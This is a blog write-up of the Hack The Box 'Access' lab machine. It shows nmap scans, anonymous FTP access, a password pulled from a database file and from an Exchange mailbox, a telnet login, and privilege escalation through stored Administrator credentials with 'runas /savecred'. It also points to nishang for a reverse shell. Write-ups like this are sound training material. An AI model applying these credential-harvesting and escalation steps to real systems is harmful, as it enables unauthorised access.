<!DOCTYPE html>
<html lang="en" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="External Recon # We kick off a basic &ldquo;nmap&rdquo; scan:
nmap -sC -sV 10.10.10.98 PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 23/tcp open telnet? 80/tcp open http Microsoft IIS httpd 7.5 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows As you can see, we find some very common ports. When we visit the website listening on &ldquo;port 80&rdquo; we just find a picture of a server-room.
Let&rsquo;s check &ldquo;ftp&rdquo; and &ldquo;telnet&rdquo; by running another &ldquo;nmap&rdquo; scan.">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="//localhost:1313/docs/htb-writeups/access/">
  <meta property="og:site_name" content="www.tagnull.de">
  <meta property="og:title" content="Access">
  <meta property="og:description" content="External Recon # We kick off a basic “nmap” scan:
nmap -sC -sV 10.10.10.98 PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 23/tcp open telnet? 80/tcp open http Microsoft IIS httpd 7.5 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows As you can see, we find some very common ports. When we visit the website listening on “port 80” we just find a picture of a server-room.
Let’s check “ftp” and “telnet” by running another “nmap” scan.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="docs">
    <meta property="article:published_time" content="2019-03-02T00:00:00+00:00">
    <meta property="article:modified_time" content="2019-03-02T00:00:00+00:00">
<title>Access | www.tagnull.de</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/logo.png" >
<link rel="canonical" href="//localhost:1313/docs/htb-writeups/access/">
<link rel="stylesheet" href="/book.min.ed4ea100bc0474b4bd01f1e54b29b3e384852ec121eefa92d93ca6dba227b292.css" integrity="sha256-7U6hALwEdLS9AfHlSymz44SFLsEh7vqS2Tym26InspI=" crossorigin="anonymous">
  <script defer src="/fuse.min.js"></script>
  <script defer src="/en.search.min.697b21d89c9b6357b14c83a508ae07999a93e55e5374163085fbf555de2c6d4d.js" integrity="sha256-aXsh2JybY1exTIOlCK4HmZqT5V5TdBYwhfv1Vd4sbU0=" crossorigin="anonymous"></script>

  

<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>www.tagnull.de</span>
  </a>
</h2>


<div class="book-search hidden">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>
<script>document.querySelector(".book-search").classList.remove("hidden")</script>












  



  
  <ul>
    
      
        <li class="book-section-flat" >
          
  
  

  
    <span>Cheatsheet</span>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-2860456b7de11418b89bc572c43149f3" class="toggle"  />
    <label for="section-2860456b7de11418b89bc572c43149f3" class="flex justify-between">
      <a role="button" class="">Enumeration</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/cheatsheet/enumeration/nmap/" class="">network</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cheatsheet/enumeration/web/" class="">web</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-300439dc6c81e7f8106c3eab98675b63" class="toggle"  />
    <label for="section-300439dc6c81e7f8106c3eab98675b63" class="flex justify-between">
      <a role="button" class="">Active directory</a>
    </label>
  

          
  <ul>
    
  </ul>

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <input type="checkbox" id="section-f1c85964cb4e1e3e13dfaf4558a33249" class="toggle" checked />
    <label for="section-f1c85964cb4e1e3e13dfaf4558a33249" class="flex justify-between">
      <a role="button" class="">Htb writeups</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/htb-writeups/bountyhunter/" class="">BountyHunter</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/htb-writeups/cap/" class="">Cap</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/htb-writeups/the-notebook/" class="">The Notebook</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/htb-writeups/traceback/" class="">Traceback</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/htb-writeups/ret2plt-exploit/" class="">Exploit-Development - ret2plt</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/htb-writeups/safe/" class="">Safe</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/htb-writeups/fortune/" class="">Fortune</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/htb-writeups/onetwoseven/" class="">OneTwoSeven</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/htb-writeups/querier/" class="">Querier</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/htb-writeups/irked/" class="">Irked</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/htb-writeups/gettinghashes/" class="">NTLM Hashes via GPO redirect</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/htb-writeups/stratosphere/" class="">Stratosphere</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/htb-writeups/access/" class="active">Access</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/htb-writeups/ypuffy/" class="">Ypuffy</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/htb-writeups/secnotes/" class="">SecNotes - WriteUp</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <input type="checkbox" id="section-eba9495c08f1740750b4c94d7ec66515" class="toggle"  />
    <label for="section-eba9495c08f1740750b4c94d7ec66515" class="flex justify-between">
      <a role="button" class="">Oscp</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/oscp/oscp-reporting/" class="">Path to OSCP</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/oscp/oscp-exploitdev/" class="">Path to OSCP - Exploit Development</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/oscp/oscp-review/" class="">Path to OSCP - Review</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>















</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>Access</strong>

  <label for="toc-control">
    
  </label>
</div>


  
 
      </header>

      
      
  <article class="markdown book-article"><p align="center">
  <img src="access-banner2.png" />
</p>
<hr>
<h1 id="external-recon">
  External Recon
  <a class="anchor" href="#external-recon">#</a>
</h1>
<p>We kick off a basic &ldquo;nmap&rdquo; scan:</p>
<pre tabindex="0"><code>nmap -sC -sV 10.10.10.98

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre><p>As you can see, we find some very common ports.
When we visit the website listening on &ldquo;port 80&rdquo; we just find a picture
of a server-room.</p>
<p>
  <img src="access-port80.png" alt="Not so big" /></p>
<p>Let&rsquo;s check &ldquo;ftp&rdquo; and &ldquo;telnet&rdquo; by running another &ldquo;nmap&rdquo; scan.</p>
<pre tabindex="0"><code>nmap -A 10.10.10.98

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can&#39;t get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
</code></pre><p>First thing to note is that we have anonymous access to the &ldquo;ftp&rdquo; server.
Let&rsquo;s login an see what we find.</p>
<p>
  <a href="/#top">[Top]</a></p>
<h1 id="explore">
  Explore
  <a class="anchor" href="#explore">#</a>
</h1>
<pre tabindex="0"><code>ftp 10.10.10.98                                                                                                                            

Name (10.10.10.98:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.

ftp&gt; dir
08-23-18  08:16PM       &lt;DIR&gt;          Backups
08-24-18  09:00PM       &lt;DIR&gt;          Engineer
</code></pre><p>In both directories are files. I downloaded them with <code>get &lt;filename&gt;</code>.</p>
<p>
  <img src="access-ftp-files.png" alt="FTP-Files" /></p>
<p>The zip file was password protected. So, I moved over to the database file.
I ran the tool &ldquo;strings&rdquo; and &ldquo;grep&rdquo; on it and hoped for a quick win. Perhaps we find a password.</p>
<p>And indeed I found a password to the zip:</p>
<pre tabindex="0"><code>strings backup.mdb | grep access
access4u@security
</code></pre><p>Of cause I tried different versions of this. <code>grep passw</code> and others.
To be honest. I don&rsquo;t know what else I tried. Perhaps I just piped &ldquo;strings&rdquo; into &ldquo;more&rdquo;
and searched manually. ;)</p>
<p>However in the zip file, I found a &ldquo;.pst&rdquo; file. If you don&rsquo;t know what this is, you
can run <code>file</code> against it and find out it&rsquo;s a &ldquo;Microsoft Exchange&rdquo; format for Mailboxes.</p>
<p>We can&rsquo;t read it how it is right now. So I searched for a converter. Very quickly
I came across &ldquo;pst-tools&rdquo;. You can get them via &ldquo;apt&rdquo; in &ldquo;kali&rdquo;.</p>
<p>After installing it, I ran <code>readpst</code>. It converted the file to a &ldquo;.mbox&rdquo; file.
You can get the file <a href="https://www.tagnull.de/post/access/access_controll.mbox">here</a>.</p>
<p>In it you find an email from John.</p>
<blockquote>
<p>Hi there,</p>
<p>The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.</p>
<p>Regards,
John</p>
</blockquote>
<p>How kind! Thanks John! :)</p>
<p>
  <a href="/#top">[Top]</a></p>
<h1 id="exploit">
  Exploit
  <a class="anchor" href="#exploit">#</a>
</h1>
<p>Let&rsquo;s login with our new credentials:</p>
<p>
  <img src="access-telnet.png" alt="Telnet" /></p>
<p>And we&rsquo;ve got a shell. Including <code>user.txt</code></p>
<pre tabindex="0"><code>C:\Users\security\Desktop&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security\Desktop

08/28/2018  06:51 AM    &lt;DIR&gt;          .
08/28/2018  06:51 AM    &lt;DIR&gt;          ..
08/21/2018  10:37 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  16,767,012,864 bytes free
</code></pre><p>
  <a href="/#top">[Top]</a></p>
<h1 id="internal-recon">
  Internal Recon
  <a class="anchor" href="#internal-recon">#</a>
</h1>
<p>I searched around in the box for clues how to proceed. Eventually I checked for stored
credentials:</p>
<pre tabindex="0"><code>cmdkey /list

Currently stored credentials:
Target: Domain:interactive=ACCESS\Administrator
Type: Domain Password
User: ACCESS\Administrator
</code></pre><p>If you want to learn more about &ldquo;Windows Enumeration&rdquo; check this <a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide" target="_blank">blog</a>.
He has some <code>HackTheBox</code> WriteUps too.</p>
<p>
  <a href="/#top">[Top]</a></p>
<h1 id="privilege-escalation">
  Privilege Escalation
  <a class="anchor" href="#privilege-escalation">#</a>
</h1>
<p>In order to use those stored credentials, I used &ldquo;runas&rdquo; with the &ldquo;/savecreds&rdquo; option.</p>
<p><code>runas /user:ACCESS\Administrator /savecred &quot;cmd.exe /c type c:\users\administrator\desktop\root.txt C:\Users\security\AppData\Local\Temp\root.txt&quot;</code></p>
<p>
  <a href="/#top">[Top]</a></p>
<h1 id="root-flag">
  Root Flag
  <a class="anchor" href="#root-flag">#</a>
</h1>
<p>So we&rsquo;ve got our root.txt:</p>
<p>
  <img src="access-root.png" alt="Root" /></p>
<p>But getting a shell is fun. At least when you don&rsquo;t do a writeup. For some reason my payloads wouldn&rsquo;t work anymore.
So I had to figure out another way to get a shell.</p>
<p>I won&rsquo;t give you the complete rundown today. I probably will do a seperate blog for different shells in the near future.
Just get yourself this repo: <a href="https://github.com/samratashok/nishang" target="_blank">Github: nishang</a> and play with
&ldquo;Invoke-PowershellTCP&rdquo;. It&rsquo;s cool! :)</p>
<p>
  <img src="access-shell.png" alt="Shell" /></p>
<p>
  <a href="/#top">[Top]</a></p>
<h1 id="lessons-learned">
  Lessons Learned
  <a class="anchor" href="#lessons-learned">#</a>
</h1>
<p>I should learn to take propper notes on my machines. I had to do the machine a second time basicly. <em>sigh</em></p>
<p>That&rsquo;s it for today. Have a nice one!</p>
<p>x41</p>
<p>
  <a href="/#top">[Top]</a></p>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">





</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
  </main>

  
</body>
</html>












